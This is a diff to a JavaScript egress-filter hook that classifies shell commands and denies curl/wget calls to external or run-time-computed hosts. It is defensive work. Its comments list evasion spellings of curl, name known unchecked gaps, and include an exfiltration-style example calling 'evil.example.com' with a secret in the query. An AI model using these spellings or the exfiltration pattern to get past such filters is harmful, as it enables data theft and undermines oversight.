@@ -61,7 +61,8 @@
 //
 // HOW IT READS THE COMMAND: structure from the MASKED text (maskInertLiterals blanks quoted strings
 // and heredoc bodies, length-preserving), so a `curl` or `;` inside a quoted argument or a heredoc
-// is not a command; the URL from the ORIGINAL text of the same span. A heredoc body is read only
+// is not a command; the URL from the ORIGINAL text of the same span, and the command word as bash
+// runs it (unquoted, variables expanded: `"curl"`, `cu''rl`, `C=curl; $C` are curl). A heredoc body is read only
 // where it is stdin to an interpreter or a `read` loop (4. and 3.); to anything else (`cat <<EOF`,
 // `curl --data-binary @- <<'JSON'`) it stays inert text.
 //
@@ -71,14 +72,14 @@
 //   - a program that reaches an interpreter through a PIPE or a file rather than through a heredoc /
 //     here-string attached to the interpreter itself;
 //   - a destination that a DIFFERENT command reads from stdin and turns into arguments (argument
-//     builders such as xargs or parallel);
-//   - values bound by builtins other than `for` and a plain `read`: array fillers (mapfile /
-//     readarray), `read -a` elements beyond the first, and `read` under a non-default IFS (only
-//     whitespace splitting is modelled);
-//   - loop or command input that comes from a file, a process substitution or a pipe, not from a
-//     literal here-string / heredoc in the command;
-//   - a URL whose host is not literally in the command (a previous command, or a value computed at
-//     runtime by a command substitution);
+//     builders such as xargs or parallel: `xargs curl` has no URL in its argv);
+//   - for an INTERPRETER one-liner (not curl / wget): values bound by builtins other than `for` and a
+//     plain `read`, loop input from a file or a pipe, and a URL not literally in the command. For
+//     curl and wget all of these DENY since #1931 round 3: a destination host still holding a `$`
+//     after the command's own assignments and loops are expanded is computed at run time and
+//     denied, a substitution's place included (`curl $(echo URL)`, `H=$(cat f); curl "http://$H"`).
+//     The cost, measured on 1546 fleet curl/wget commands: a URL read from the vault into a
+//     variable and then fetched (`U=$(curl .../api/vault/...); curl "$U/..."`) is denied too;
 //   - an rc file written by an EARLIER call: ~/.wgetrc and ~/.curlrc are read by every wget / curl
 //     run and can set a proxy or extra URLs. Assigning WGETRC / CURL_HOME / HOME in the command is
 //     denied (5.), the default file itself is not checked;
@@ -404,16 +405,24 @@ function backtickEnd(text, i) { // text[i] is ` -> index just past the closing `
 export function liftSubstitutions(text) {
   // herestrings: offsets of every LIVE `<<<` operator (blanked in `stripped`, so the caller cannot
   // find them there any more). A `<<<` inside quotes or a heredoc body is text and is not listed.
-  const inners = []; const herestrings = []; let out = ''; let i = 0
-  // A live substitution at `at` is lifted (blanked, inner kept); returns the next index or -1.
-  const lift = (at) => {
-    if (text[at] === '$' && text[at + 1] === '(') {
+  const inners = []; const herestrings = []; const bodies = []; let out = ''; let i = 0
+  // A live substitution at `at` is lifted (inner kept); returns the next index or -1.
+  // Its place is filled with `$` (length-preserving), not blanked (#1931, round 3): the value is
+  // computed at run time, so wherever it lands -- a curl / wget destination, a variable that later
+  // becomes one -- it must read as UNRESOLVED, which denies (destHost). Blanked, `curl $(echo URL)`
+  // had no destination at all and passed.
+  // Inside backquotes a backslash before $, ` or \ is dropped, so an escaped backquote there opens
+  // a NESTED substitution: the inner text is unescaped before it is judged.
+  // A process substitution <(...) / >(...) runs its command like $(...); it is lifted at the top
+  // level only (inside double quotes it is text).
+  const lift = (at, procSubst = false) => {
+    if ((text[at] === '$' || (procSubst && (text[at] === '<' || text[at] === '>'))) && text[at + 1] === '(') {
       const j = substEnd(text, at)
-      inners.push(text.slice(at + 2, j - 1)); out += ' '.repeat(j - at); return j
+      inners.push(text.slice(at + 2, j - 1)); out += '$'.repeat(j - at); return j
     }
     if (text[at] === '`') {
       const j = backtickEnd(text, at)
-      inners.push(text.slice(at + 1, j - 1)); out += ' '.repeat(j - at); return j
+      inners.push(text.slice(at + 1, j - 1).replace(/\\([$`\\])/g, '$1')); out += '$'.repeat(j - at); return j
     }
     return -1
   }
@@ -453,6 +462,7 @@ export function liftSubstitutions(text) {
       const endRx = new RegExp(`^[ \\t]*${tag.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}[ \\t]*$`, 'm')
       const rel = endRx.exec(text.slice(i))
       const bodyEnd = rel ? i + rel.index : text.length
+      bodies.push([i, bodyEnd])
       if (quotedTag) out += text.slice(i, bodyEnd); else copyLive(i, bodyEnd)
       i = bodyEnd
       continue
@@ -480,11 +490,11 @@ export function liftSubstitutions(text) {
       if (j >= text.length) { copyLive(i + 1, text.length); i = text.length; continue }
       copyLive(i + 1, j); out += '"'; i = j + 1; continue
     }
-    const n = lift(i)
+    const n = lift(i, true)
     if (n !== -1) { i = n; continue }
     out += c; i++
   }
-  return { stripped: out, inners, herestrings }
+  return { stripped: out, inners, herestrings, bodies }
 }
 // curl's DESTINATION is not only a scheme-bearing URL. A positional argument is always a URL to
 // curl, and with no scheme curl guesses http:// -- so `curl evil.example.com/x?d=secret` reaches
@@ -604,7 +614,11 @@ export function destHost(value) {
   const m = /^(?:[^@/?#]*@)?(\[[^\]]*\]|[^/:?#]*)/.exec(noScheme)
   const h = m ? m[1].toLowerCase() : ''
   if (HOSTNAME.test(h)) return h
-  if (h === '' || h === '-' || h === '.' || h === '..' || h === '~' || h.includes('$')) return null
+  // A host still holding a `$` after this command's own assignments and loops were expanded is
+  // computed at run time (the environment, printf -v, a read from a file, a substitution): with the
+  // switch on it would go unchecked, so it denies (#1931, round 3).
+  if (h.includes('$')) return `<unresolved: ${h}>`
+  if (h === '' || h === '-' || h === '.' || h === '..' || h === '~') return null
   // Anything else written as the host is still a destination the program will try: a single label,
   // 0x0a.0.0.1, 167772161, 10.1 -- and (#1931 review) a host that is not plain [a-z0-9.-] at all: a
   // non-ASCII look-alike, a %-encoded name, a curl glob (`evil.{com,org}`). It can never equal a
@@ -886,6 +900,7 @@ export function envIndirect(orig, masked) {
     if (cmd === 'read') {
       for (let k = 0; k < rest.length; k++) {
         const x = rest[k]
+        if (/^\d*[<>]/.test(x)) { if (/^\d*(?:<>|>>?|<)&?$/.test(x)) k++; continue } // a redirection, not a name
         if (x.startsWith('-') && x.length > 1) { if (READ_OPT_WITH_VALUE.has(x[x.length - 1])) { if (x.endsWith('a') && badName(rest[k + 1] ?? '')) return `read ${rest[k + 1]}`; k++ } continue }
         if (badName(x)) return `read ${x}`
       }
@@ -941,15 +956,31 @@ export function positionalBody(body, args) {
 }
 const NESTING_LIMIT = { deny: true, reason: 'nesting-limit', hosts: ['<too deeply nested to read>'] }
 const MAX_DEPTH = 4
+// Is offset `at` of `text` inside a quoted string? The span splitter cuts on `;` / newline in the
+// masked text, which keeps a double-quoted payload's content, so a span can start INSIDE a quoted
+// JSON body; its first word is then no command at all (measured on the fleet's commands: three
+// `-d "..."` payloads read as a computed command word).
+function insideQuote(text, at) {
+  let q = null
+  for (let k = 0; k < at; k++) {
+    const c = text[k]
+    if (q === "'") { if (c === "'") q = null; continue }
+    if (c === '\\') { k++; continue }
+    if (q === '"') { if (c === '"') q = null; continue }
+    if (c === "'" || c === '"') q = c
+  }
+  return q !== null
+}
 export function classify(command, depth = 0, vendorHosts = new Set(), vendorDomains = new Set()) {
   const norm = String(command ?? '').replace(/\\\r?\n/g, ' ')
-  const { stripped: orig, inners, herestrings } = liftSubstitutions(norm)
+  const { stripped: orig, inners, herestrings, bodies } = liftSubstitutions(norm)
   // #1931 delta review: what is too deeply nested to read is DENIED, not passed unread.
   if (inners.length && depth >= MAX_DEPTH) return NESTING_LIMIT
-  for (const inner of inners) { const r = classify(inner, depth + 1, vendorHosts, vendorDomains); if (r.deny) return r }
-  const fetches = /\b(?:curl|wget)\b/.test(norm)
+  // Also with quotes and backslashes taken out: `cu''rl` and `c\url` run curl.
+  const fetches = /\b(?:curl|wget)\b/.test(norm) || /\b(?:curl|wget)\b/.test(norm.replace(/['"\\]/g, ''))
   const masked = maskInertLiterals(orig)
   if (masked === null || masked.length !== orig.length) {
+    for (const inner of inners) { const r = classify(inner, depth + 1, vendorHosts, vendorDomains); if (r.deny) return r }
     // Since curl https:// and wget can leave the deny list, this hook is their only gate: a command
     // naming either that cannot be parsed denies, like the internal-error path. Anything else keeps
     // the fail-open (#1931 delta review).
@@ -970,6 +1001,17 @@ export function classify(command, depth = 0, vendorHosts = new Set(), vendorDoma
     if (c !== 'done' && c !== 'read') continue
     const text = f.expands ? expand(f.text, env) : f.text
     for (const r of reads) for (const [v, vals] of Object.entries(readValues(text, r))) loops[v] = [...(loops[v] ?? []), ...vals]
+  }
+  // A $(...) / backtick / <(...) runs with THIS command's variables: `for u in <hosts>; do echo
+  // "$(curl $u)"; done` binds u inside the substitution too. So each inner is judged once per loop
+  // reading, with the assignments expanded; read alone it would hold an unresolved $u (#1931, round 3:
+  // measured on the fleet's own commands, a private-IP loop of exactly this shape).
+  for (const inner of inners) {
+    const plainInner = expand(inner, env)
+    const vs = loopVariants(inner, env, loops)
+    if (vs === null && /\b(?:curl|wget)\b/.test(inner)) return { deny: true, reason: 'loop-unbounded', hosts: [] }
+    const readings = vs !== null && vs.some((v) => v !== plainInner) ? vs : [plainInner]
+    for (const t of readings) { const r = classify(t, depth + 1, vendorHosts, vendorDomains); if (r.deny) return r }
   }
   // A heredoc / here-string that IS the program of an interpreter is judged like a -c / -e body: the
   // same NET_PRIMITIVE test, the same URL_RE scan, the same local / private / vendor exceptions. A
@@ -995,6 +1037,11 @@ export function classify(command, depth = 0, vendorHosts = new Set(), vendorDoma
     if (variants === null) return { deny: true, reason: 'heredoc-loop-unbounded', hosts: [] }
   }
   for (const [a, b] of spans(masked)) {
+    // A heredoc body is data for the command it is fed to, never a command line here: a body fed to a
+    // shell or an interpreter was judged above (feeds), a `$(...)` in an unquoted body is an inner.
+    // Read word by word it turned a script being WRITTEN (`cat > s.sh <<'EOF'` ... `curl ...`) into a
+    // call (#1931, round 3, measured on the fleet's commands).
+    if (bodies.some(([s0, e0]) => a >= s0 && a < e0)) continue
     const mw = words(masked.slice(a, b))
     const i = commandIndex(mw)
     if (i >= mw.length) continue
@@ -1004,7 +1051,16 @@ export function classify(command, depth = 0, vendorHosts = new Set(), vendorDoma
     const plain = expand(orig.slice(a, b), env)
     const variants = loopVariants(orig.slice(a, b), env, loops)
     for (const text of [plain, ...(variants ?? [])]) {
-      const cmd = mw[i].split('/').pop()
+      // The command word as bash runs it: unquoted and with this command's variables expanded. Read
+      // from the masked words it was blind to `"curl"`, `cu''rl`, `c\url` and `C=curl; $C` (#1931,
+      // round 3, measured: all ten such spellings passed).
+      const uw = shellWords(text)
+      const cmd = (uw[commandIndex(uw)] ?? mw[i]).split('/').pop()
+      // A command word computed at run time ($CMD, $(...)) is a program this hook cannot name: it
+      // denies when the command mentions curl / wget or points at an external URL.
+      if (cmd.includes('$') && !insideQuote(orig, a) && (fetches || [...text.matchAll(URL_RE)].some((m) => isExternal(m[0])))) {
+        return { deny: true, reason: 'unresolved-command', hosts: [`<command computed at run time: ${cmd.slice(0, 40)}>`] }
+      }
       const call = shellCommandCall(cmd, text)
       if (call !== null) {
         if (depth >= MAX_DEPTH) return NESTING_LIMIT
@@ -1028,6 +1084,9 @@ export function classify(command, depth = 0, vendorHosts = new Set(), vendorDoma
       const at = argv ? argv.findIndex((w) => w.split('/').pop() === target) : -1
       if (at !== -1) found = (target === 'curl' ? curlDestinations : wgetDestinations)(argv.slice(at + 1))
       else found = [...text.matchAll(URL_RE)].map((m) => m[0]).filter(isExternal).map(hostOf)
+      // The PLAIN reading leaves a loop variable unexpanded; its values are judged in the loop
+      // readings that follow, so here alone an unresolved host is not a finding.
+      if (text === plain && (variants === null || variants.some((v) => v !== plain))) found = found.filter((h) => !h.startsWith('<unresolved:'))
       // A listed vendor host (or a host under a listed domain) passes only by itself: any other
       // destination in the same call still denies.
       const hosts = [...new Set(found)].filter((h) => !vendorHosts.has(h) && !hostInDomains(h, vendorDomains))
